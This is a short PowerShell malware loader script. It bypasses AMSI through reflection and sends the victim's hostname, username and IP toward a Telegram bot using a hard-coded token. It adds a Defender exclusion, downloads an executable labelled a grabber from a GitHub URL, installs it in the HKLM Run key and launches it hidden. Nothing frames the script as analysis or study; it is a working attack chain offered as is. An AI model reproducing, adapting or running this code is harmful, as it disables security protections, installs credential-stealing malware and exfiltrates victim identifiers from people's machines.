# 1. AMSI Bypass
$a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b;break}}
$d=$c.GetField("amsiInitFailed","NonPublic,Static");$d.SetValue($null,$true)

# 2. SUCCESS NOTIFICATION (Cleaned of Emojis)
try {
    $ip = (Invoke-RestMethod -Uri 'https://ipify.org').ip
    $hostName = $env:COMPUTERNAME
    $user = $env:USERNAME
    $msg = "SUCCESS - Host: $hostName | User: $user | IP: $ip | Status: Executing"
    
    $token = "7978003950:AAEaommu0ospO2aDUL0fuYQA7XfgQMXR_Os"
    $chatId = "8051121194"
    $url = "https://telegram.org"
    
    Invoke-RestMethod -Uri $url -Method Post
} catch {}

# 3. Payload Delivery
$baseDir = "$env:APPDATA\Microsoft\Windows\Templates"
$grabberUrl = "https://github.com/ashleywilmer7-star/trimiez/raw/refs/heads/main/combined.exe"
$HKLM = [uint32]2147483650
$wmi = [WMIClass]"root\default:StdRegProv"

if (!(Test-Path $baseDir)) { New-Item -Path $baseDir -Force -ItemType Directory }
powershell -Command "Add-MpPreference -ExclusionPath '$baseDir'"

(New-Object Net.WebClient).DownloadFile($grabberUrl, "$baseDir\sys_sync.exe")

# 4. Persistence
$runPath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
$wmi.CreateKey($HKLM, $runPath)
$wmi.SetStringValue($HKLM, $runPath, "SystemSync", "$baseDir\sys_sync.exe")

# 5. Execution
Start-Process "$baseDir\sys_sync.exe" -WindowStyle Hidden
